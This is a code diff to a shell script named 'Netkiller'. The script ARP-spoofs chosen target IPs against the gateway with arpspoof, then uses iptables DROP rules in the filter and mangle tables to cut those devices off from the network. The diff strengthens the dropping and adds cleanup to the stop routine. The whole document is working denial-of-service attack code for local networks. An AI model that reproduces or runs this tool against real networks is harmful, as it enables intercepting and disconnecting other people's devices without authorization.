@@ -23,6 +23,7 @@ fi
 # IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
+iptables -P FORWARD DROP
 iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
 echo " "
 
@@ -36,6 +37,9 @@ echo -e "\nUnblocking network devices..."
 pkill -f arpspoof
 pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
+iptables -P FORWARD ACCEPT
+iptables -t mangle -F FORWARD 
+iptables -t mangle -F PREROUTING
 iptables -F FORWARD
 sleep 2
 echo -e "\nConnection is restored..."
@@ -233,10 +237,10 @@ for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      PIDS+=($!)
-     iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-     iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
+     iptables -A FORWARD -s "$TARGET" -j DROP
+     iptables -t mangle -A FORWARD -s "$TARGET" -j DROP
+     iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
 done
-
 echo " "
 echo "To stop Netkiller, run: netkiller-stop"
 echo " "
